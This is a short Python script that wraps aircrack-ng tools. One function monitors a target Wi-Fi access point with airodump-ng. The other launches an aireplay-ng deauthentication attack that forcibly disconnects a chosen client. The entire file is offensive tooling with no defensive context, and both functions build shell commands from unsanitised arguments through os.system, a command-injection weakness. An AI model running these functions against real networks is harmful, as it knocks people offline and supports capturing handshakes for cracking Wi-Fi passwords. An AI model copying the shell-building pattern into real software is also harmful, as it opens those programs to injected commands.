import os

def scan(bssid, channel, interface):
	os.system(f"airodump-ng --bssid {bssid} --channel {channel} {interface}")


def deauth(client, access, quantity, interface):
	os.system(f"aireplay-ng -0 {quantity} -a {access} -c {client} {interface}")
